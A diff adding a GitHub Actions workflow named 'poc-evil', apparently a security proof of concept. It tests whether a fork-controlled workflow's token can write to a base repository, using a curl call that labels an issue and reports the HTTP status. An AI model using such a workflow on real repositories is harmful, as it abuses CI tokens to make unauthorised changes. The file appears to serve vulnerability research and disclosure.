@@ -1,0 +1,14 @@
+name: poc-evil
+on:
+  push:
+permissions:
+  pull-requests: write
+  contents: read
+jobs:
+  evil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "FORK-EVIL-RAN repo=${{ github.repository }} ref=${{ github.ref }} actor=${{ github.actor }}"
+          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token ${{ github.token }}" -H "Accept: application/vnd.github+json" https://api.github.com/repos/mergify-poc-gng/privesc-poc/issues/41/labels -d '{"labels":["FORK-WF-TRUSTED"]}')
+          echo "BASE_WRITE_HTTP=$code (201=fork-controlled wf got BASE write token = CRITICAL)"
